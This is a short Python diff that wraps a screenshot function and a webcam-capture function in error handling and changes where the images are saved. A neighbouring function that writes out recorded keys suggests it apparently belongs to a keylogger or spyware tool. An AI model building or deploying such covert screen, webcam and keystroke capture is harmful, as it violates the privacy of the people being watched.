@@ -51,17 +51,27 @@ def write_legible_text_to_file(keys: dict, file_name: str):
 
 def take_screenshot():
     file_name = str(uuid.uuid4()) + '.png'
-    screenshot = image_grab.grab()
-    filepath = './screenshots/' + file_name
-    screenshot.save(filepath)
-    return filepath
+    try:
+        screenshot = image_grab.grab()
+        filepath = file_name
+        screenshot.save(filepath)
+        return filepath
+    except Exception as e:
+        print(e)
+        print("Error taking screenshot")
+        return None
 
 
 def take_picture_from_webcam():
     file_name = str(uuid.uuid4()) + '.png'
-    webcam = cv2.VideoCapture(0)
-    check, frame = webcam.read()
-    filepath = './screenshots/' + file_name
-    cv2.imwrite(filepath, frame)
-    webcam.release()
-    return filepath
+    try:
+        webcam = cv2.VideoCapture(0)
+        check, frame = webcam.read()
+        filepath = file_name
+        cv2.imwrite(filepath, frame)
+        webcam.release()
+        return filepath
+    except Exception as e:
+        print(e)
+        print("Error taking picture from webcam")
+        return None
